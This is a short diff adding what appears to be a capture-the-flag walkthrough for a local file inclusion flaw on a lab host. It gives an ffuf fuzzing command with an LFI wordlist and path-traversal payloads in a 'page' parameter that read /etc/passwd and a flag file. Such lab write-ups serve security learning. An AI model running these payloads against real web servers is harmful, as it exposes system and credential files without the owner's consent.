@@ -1,0 +1,8 @@
+1- find the subdirectories from the website
+command: ffuf -w ~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://10.82.172.242/?page=FUZZ" -t 100 -fl 124
+
+2- Take any payload from the result and put it in the page of the browser we can open a sensitive data
+as that: ?page=../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+3- we can exchange the sensitive passwd folder by the flag file
+as that: ?page=../../../../../../../../../../../../../../../../../../../../../../flag.txt
